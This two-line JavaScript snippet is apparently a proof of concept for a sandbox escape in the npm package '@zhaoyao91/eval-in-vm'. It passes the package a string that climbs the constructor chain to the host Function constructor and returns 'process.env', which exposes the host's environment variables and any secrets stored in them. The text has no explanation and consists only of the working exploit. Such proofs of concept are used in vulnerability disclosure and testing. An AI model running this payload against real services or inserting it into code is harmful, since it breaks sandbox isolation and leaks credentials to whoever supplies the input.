const _eval = require('@zhaoyao91/eval-in-vm')
_eval("this.constructor.constructor('return process.env')()");
